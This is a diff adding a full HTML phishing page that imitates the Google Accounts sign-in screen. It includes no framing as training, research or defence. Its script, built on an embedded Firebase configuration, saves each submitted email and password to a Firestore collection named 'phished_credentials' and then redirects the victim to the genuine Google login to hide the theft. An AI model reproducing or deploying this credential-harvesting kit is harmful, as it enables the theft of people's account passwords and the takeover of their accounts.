@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sign in – Google Accounts</title>
+  <link rel="icon" href="https://img.icons8.com/color/512/google-logo.png" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      padding: 40px 40px;
+      width: 360px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 75px;
+    }
+
+    h2 {
+      font-weight: 500;
+      font-size: 24px;
+      margin-bottom: 8px;
+      color: #202124;
+    }
+
+    p.subtitle {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 25px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #1a73e8;
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #1967d2;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 20px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://img.icons8.com/color/512/google-logo.png" alt="Google Logo" />
+    </div>
+    <h2>Sign in</h2>
+    <p class="subtitle">Use your Google Account</p>
+
+    <form id="phishForm">
+      <input type="email" id="username" placeholder="Email or phone" required />
+      <input type="password" id="password" placeholder="Enter your password" required />
+      <button type="submit">Next</button>
+    </form>
+
+    <div class="footer">Not your computer? Use Guest mode to sign in privately.</div>
+  </div>
+
+  <script>
+    // Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDaw14ObskGwa7hQercSk1fV2UKjPAR9WM",
+      authDomain: "messagesystem-eeeff.firebaseapp.com",
+      projectId: "messagesystem-eeeff",
+      storageBucket: "messagesystem-eeeff.appspot.com",
+      messagingSenderId: "598313955367",
+      appId: "1:598313955367:web:eed85937a6586f93aa9e02",
+      measurementId: "G-FQNJ572KWM"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Capture form submission
+    document.getElementById("phishForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      db.collection("phished_credentials").add({
+        username: username,
+        password: password,
+        timestamp: new Date()
+      }).then(() => {
+        alert("Signing in...");
+        setTimeout(() => {
+          window.location.href = "https://accounts.google.com"; // Redirect to legit page
+        }, 1200);
+      }).catch((error) => {
+        console.error("Firebase error:", error);
+      });
+    });
+  </script>
+</body>
+</html>
